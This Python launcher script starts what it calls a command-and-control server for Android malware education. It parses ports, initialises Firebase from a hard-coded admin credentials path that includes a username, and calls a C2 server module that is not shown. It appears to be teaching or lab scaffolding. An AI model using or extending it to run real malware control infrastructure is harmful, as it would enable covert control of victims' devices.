#!/usr/bin/env python3
import argparse
import log_util
from log_util import setup_logging
from http_server import run_c2_server
from firebase_client import initialize_firebase

# Constants
DEFAULT_PORT = 42069


def main():
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="C2 Server for Android Malware Education")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT,
                        help=f"Port to listen on (default: {DEFAULT_PORT})")
    parser.add_argument("--no-ssl", action="store_true",
                        help="Disable SSL (not recommended)")
    parser.add_argument("--admin-port", type=int, default=8080,
                        help="Port for admin console (default: 8080)")
    parser.add_argument("--firebase-cred", type=str,
                        default="C:\\Users\\tanwm\\Desktop\\databse-7d740-firebase-adminsdk-fbsvc-7aba2c03f2.json",
                        help="Path to Firebase credentials file")

    args = parser.parse_args()

    # Setup logging
    logger = setup_logging()

    # Initialize Firebase
    if not initialize_firebase(args.firebase_cred):
        logger.error("Failed to initialize Firebase, exiting.")
        return

    # Run server
    run_c2_server(args.port, args.admin_port)


if __name__ == "__main__":
    main()